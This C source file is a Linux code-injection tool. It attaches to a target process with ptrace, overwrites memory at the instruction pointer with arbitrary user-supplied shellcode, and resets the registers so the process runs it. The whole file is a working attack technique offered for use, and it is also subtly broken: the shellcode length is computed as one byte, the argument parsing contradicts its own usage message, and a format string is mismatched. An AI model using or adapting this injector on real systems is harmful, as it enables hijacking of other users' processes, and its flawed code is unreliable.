#include "code_injector.h"


#include <stdio.h>
#include <string.h>
#include <stdint.h>


void log_syscall_failure(int syscallReturnCode, char* errorMessage){
    perror(errorMessage);
    exit(syscallReturnCode);
}

int attach_target_process(pid_t processId){
    printf("[+] Attaching process %d\n", processId);
    int syscallReturnCode = ptrace(PTRACE_ATTACH, processId, NULL, NULL); 
    if (syscallReturnCode < 0){
        log_syscall_failure(syscallReturnCode, "[-] Ptrace Attach syscall has failed\n");
    }
    printf("[+] Waiting for process...\n");
    wait(NULL);
    return 0;
}

int detach_target_process(pid_t processId){
    int syscallReturnCode = ptrace(PTRACE_DETACH, processId, NULL, NULL);
    if (syscallReturnCode < 0){
        log_syscall_failure(syscallReturnCode, "[-] Ptrace detach syscall has failed\n");
	}
    return 0;
}

struct user_regs_struct get_target_process_registers(pid_t processId){
    struct user_regs_struct  targetProcessRegisters;
    printf("[+] Getting target process registers\n");
    int syscallReturnCode = ptrace(PTRACE_GETREGS, processId, NULL, &targetProcessRegisters); 
    if (syscallReturnCode < 0){
        log_syscall_failure(syscallReturnCode, "[-] Ptrace Get regs syscall has failed\n");
    }
    return targetProcessRegisters;
}

int inject_shellcode(pid_t targetProcessId, struct user_regs_struct targetProcessRegisters, char* shellCode){
    void* targetProcessInstructionPointer = (void*) targetProcessRegisters.rip;
    printf("[+] Injecting shellcode to the target process RIP register: %p\n", targetProcessRegisters.rip);
    uint32_t *shellCodeStartAddress = (uint32_t *) shellCode;
    uint32_t *memoryAddressToChange = (uint32_t *) targetProcessInstructionPointer;
    printf("[+] shell code payload starting address %p\n", shellCode);

    printf("[+] target Process Insturction pointer %p\n", targetProcessInstructionPointer);

    printf("Shell code's size: %zu\n", sizeof(*shellCode));

    for (int i = 0; i < sizeof(*shellCode); i+=4, *shellCodeStartAddress++, *memoryAddressToChange++){
            printf("[+] Running the ptrace syscall with the parameters: %d,\n %p,\n %s\n", targetProcessId, memoryAddressToChange, *shellCodeStartAddress);
            int syscallReturnCode = ptrace(PTRACE_POKETEXT, targetProcessId, memoryAddressToChange, *shellCodeStartAddress);
            if (syscallReturnCode < 0){
                log_syscall_failure(syscallReturnCode, "[-] PTRACE POKETEXT syscall failed\n");
            }
        }
    printf ("[+] Setting instruction pointer to %p\n", (void*)targetProcessRegisters.rip);
    int syscallReturnCode = ptrace(PTRACE_SETREGS, targetProcessId, NULL, &targetProcessRegisters);
    if(syscallReturnCode < 0){
         log_syscall_failure(syscallReturnCode, "[-] Ptrace Set Registers syscall failed\n");
        }
     return 0;
}

int inject(pid_t processId, char* shellCode){
    attach_target_process(processId);
    inject_shellcode(processId, get_target_process_registers(processId), shellCode);
    detach_target_process(processId);
    return 0;
}


int main(int argc, char* argv[], char *envp[]){
    if (argc != 3){
        fprintf(stderr, "Usage: ./linux_code_injector --target-process <pid> --shell-code <string>\n", argv[0]);
        exit(-1);
    }
    pid_t targetProcess = atoi(argv[1]);
    char* shellCode = (char* )argv[2];
    inject(targetProcess, shellCode);
    return 1;
}
